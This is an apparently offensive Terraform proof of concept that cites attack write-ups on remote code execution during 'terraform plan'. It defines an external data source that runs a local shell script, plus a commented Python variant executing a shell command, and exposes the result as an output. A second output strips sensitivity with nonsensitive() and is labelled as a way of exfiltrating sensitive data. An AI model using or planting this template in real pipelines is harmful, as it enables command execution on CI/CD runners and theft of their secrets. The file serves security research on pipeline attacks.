# https://github.com/technologik/terraform_attack_automation/blob/main/PR_attack.py#L80C48-L80C55
# https://github.com/technologik/terraform_attack_automation/blob/main/templates/exec_command.tf
# https://alex.kaskaso.li/post/terraform-plan-rce
# https://www.tenable.com/blog/the-dark-side-of-domain-specific-languages-uncovering-new-attack-techniques-in-opa-and?cf_target_id=8DEE8756E320787BE367AEC58ADA4CD3
# https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security#rce-in-terraform
data "external" "local_exec" {
  #program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
  program = ["bash", "${path.module}/local-exec.sh"]
}

output "external_local_exec_output" {
  value = data.external.local_exec.result
}

# in case you are getting problems exfiltrating sensitive data
output "result" {
  value = nonsensitive(var.value)
}
